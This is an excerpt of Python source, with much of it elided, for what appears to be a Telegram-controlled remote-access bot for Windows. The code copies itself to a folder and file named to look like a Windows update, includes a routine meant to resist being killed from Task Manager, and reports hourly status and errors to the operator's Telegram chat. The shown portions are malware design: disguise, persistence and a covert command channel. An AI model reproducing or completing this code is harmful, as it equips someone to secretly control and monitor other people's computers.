...
BOT_TOKEN = '' # Thay token bot vào đây
CHAT_ID = '' # Chat ID của AE
bot = TeleBot(BOT_TOKEN)

BACKUP_DIR = "C:\\ProgramData\\WindowsUpdate"
BACKUP_FILE = os.path.join(BACKUP_DIR, "system_update.exe")

# Chống kill từ Task Manager (currently ineffective, left as is)
def prevent_kill():
    while True:
...
def heartbeat():
    while True:
        time.sleep(3600)
        send_message("🫀 Bot vẫn đang chạy.")
...
if __name__ == '__main__':
    ...
    while True:
        try:
            ...
            send_message(f"⚠️ Lỗi polling: {e}")
            time.sleep(10)